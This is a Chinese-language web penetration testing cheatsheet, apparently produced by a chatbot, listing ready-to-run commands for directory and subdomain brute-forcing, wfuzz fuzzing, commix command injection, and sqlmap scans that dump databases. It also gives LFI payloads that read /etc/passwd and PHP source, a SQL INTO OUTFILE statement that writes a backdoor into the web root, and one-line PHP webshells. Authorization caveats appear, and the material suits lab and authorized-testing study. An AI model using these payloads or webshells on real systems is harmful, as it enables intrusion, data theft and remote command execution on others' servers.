# Web 渗透测试 Cheatsheet

> 基于终端截图整理的可复制 Markdown 备忘清单，按类别组织并提供常用参数与注释。

---

## 目录

1. [目录 & 文件 枚举 (Gobuster)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#gobuster)
    
2. [子域名爆破 (Gobuster DNS)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#gobuster-dns)
    
3. [IP 提取 (grep)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#grep-ip)
    
4. [模糊测试 (wfuzz / WFuzz)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#wfuzz)
    
5. [命令注入 / POST 数据 测试](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#command-injection)
    
6. [参数发现 / Burp 参数字典](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#parameter-discovery)
    
7. [认证后 Fuzzing](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#auth-fuzz)
    
8. [SQL 注入 (sqlmap)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#sqlmap)
    
9. [信息收集 (theHarvester)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#theharvester)
    
10. [Nmap: http-methods 脚本](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#nmap-http-methods)
    
11. [网络嗅探 / 扫描 (tcpdump / netdiscover)](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#network)
    
12. [LFI / php://filter 与 OUTFILE 利用技巧](https://chatgpt.com/c/69013170-93d0-8326-a814-afefdb990bfa#lfi-outfile)
    
13. [WebShell / 上传马 示例]
    
14. [快速注记与建议]
    

---

## Gobuster

```bash
# 目录爆破（目录）
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -k -l

# 文件爆破（文件名+扩展）
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -t 30 -k -l
```

**参数说明**：

- `-u` : 目标 URL
    
- `-w` : 字典文件路径
    
- `-t` : 线程数（并发）
    
- `-k` : 忽略/跳过 SSL 证书验证
    
- `-l` : 显示 HTTP 返回长度
    

---

## Gobuster DNS（子域名暴力）

```bash
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
```

> 先确保你有 DNS 解析（即目标子域名解析到可达地址），否则会遇到大量“无解析”结果。

---

## 提取 IP（从 nmap 输出等）

```bash
# 从文本中提取 IPv4 地址
grep -o "[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}" nmapfile.txt
```

---

## WFuzz / 模糊测试

```bash
# XSS 测试（单参数或页面）
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/XSS.txt "$URL"

# 命令注入 测试（POST 数据）
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt -d "do=FUZZ" "$URL"

# HTML escape 测试
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt "$URL"

# 参数存在性检测（使用 Burp 参数名字典）
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

# 文件/目录 fuzz（正常页面返回 200，404 忽略）
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL"
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"

# 认证后 fuzz 示例（携带 Cookie / HEADERS）
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "PARAM=value" "$URL"
```

**注意**：

- `-c`：彩色输出（可读性）
    
- `-z file,<path>`：指定字典文件
    
- `--hc`：hide codes（隐藏指定 HTTP 状态码，如 404）
    
- 使用 `--hh` 隐藏响应长度相同的条目以减少噪声
    

---

## 命令注入（通用）

```bash
# 使用 commix（自动化命令注入检测）示例：
commix --url="https://target/?parameter=" --level=3 --force-ssl --skip-waf --random-agent
```

**POST/GET 注入注意**：尝试盲注、时间盲注、特殊字符转义（`|`, `;`, `&&`, `` ` ``）及 URL 编码。

---

## 参数发现（Burp 参数字典）

```bash
# 使用 wfuzz 检测常见参数名
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
```

---

## 认证后 Fuzzing（示例）

```bash
# 若需要携带 Cookie 或 Authorization：
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -H "Cookie: PHPSESSID=xxxx" "$URL"
```

---

## SQLMap（自动化 SQL 注入）

```bash
# 基本扫描
sqlmap -u "$URL" --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl

# 更深的扫描并尝试 dump 数据
sqlmap -u "$URL" --threads=2 --level=4 --risk=3 --dump
```

**提示**：为避免误报，可先用 `--batch` 自动选择默认选项，但在真实评估中手动交互能更好控制探测行为。

---

## 信息收集 - theHarvester

```bash
theharvester -d domain.org -l 500 -b google
```

- `-l 500`：结果大小上限
    
- `-b`：数据源（google、bing、linkedin、shodan 等）
    

---

## Nmap - HTTP methods

```bash
nmap -p80,443 --script=http-methods --script-args http-methods.url-path='/directory/goes/here' <ip>
```

用于检测是否允许 PUT/DELETE 等危险方法（可能导致文件上传或删除）。

---

## 网络检查 / 嗅探

```bash
# 捕获 ICMP（示例）
tcpdump -i eth0 -S icmp

# 局域网发现
netdiscover -r 0.0.0.0/24
```

---

## LFI 利用技巧

```bash
# 读取 PHP 源码（base64 编码输出）
php://filter/convert.base64-encode/resource=/path/to/file.php

# 其它常见 payload：
../../../../../../etc/passwd
```

---

## SQL OUTFILE 写 webshell（仅作攻击复现说明，务必仅在授权环境下测试）

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/WEBROOT/backdoor.php";
```

> 注意：现代系统常关闭 `SELECT INTO OUTFILE` 或对 `secure_file_priv` 做限制。请在授权的靶场/实验环境中使用。

---

## WebShell / 上传马 示例

```php
# GET 方式（危险）
<?php system($_GET['cmd']); ?>

# POST 方式（文件上传后触发）
<?php system($_POST['cmd']); ?>
```

**建议**：上传马文件名、路径、权限要谨慎，测试仅限授权环境。

---

## 快速注记与建议

- 字典优先使用 `SecLists`（/opt/SecLists），根据目标调整大小（small/medium/large）。
    
- fuzz 前先确认 404/200/302 的基线响应长度以过滤噪声（wfuzz 的 `--hc/--hh` 很有用）。
    
- 对于需要登录的目标，先抓取会话 Cookie 并带入 fuzz 请求中（`-H 'Cookie: ...'`）。
    
- 避免在生产环境进行高频并发扫描，容易触发 WAF/IDS/IPS。
    
- 始终在授权范围内测试，记录每个命令与结果以便复现。
    

---

如果你需要：

- 将此文件导出为 `.md`（我可以生成下载链接）
    
- 按你的个人喜好调整字典路径或添加更多工具（例如 `ffuf`、`burpsuite`、`dirsearch` 等）
    

请告诉我你想要的扩展内容或格式（简体/繁体/English）。